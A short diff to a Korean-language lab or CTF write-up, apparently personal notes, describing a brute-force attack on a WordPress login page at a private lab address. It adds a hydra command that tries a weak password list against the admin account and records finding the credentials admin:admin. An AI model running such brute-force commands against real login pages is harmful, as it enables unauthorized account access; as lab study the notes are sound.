@@ -65,3 +65,10 @@ This XML file does not appear to have any style information associated with it. 
 로그인 정보를 갖기 위해 브루트 포스 공격 실행
 
 프록시를 설정해 로그인 시 페이지와 주고 받는 데이터 확인
+![[Pasted image 20241002125017.png]]
+
+post 데이터를 활용해 브루트 포스 공격 시도
+`hydra 192.168.56.116 http-form-post "/wordpress/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=%2Fwordpress%2Fwp-admin%2F&testcookie=1:Lost your password" -l admin -P ./weakpass.txt`
+![[Pasted image 20241002125000.png]]
+admin:admin 인 것을 확인
+![[Pasted image 20241002125106.png]]
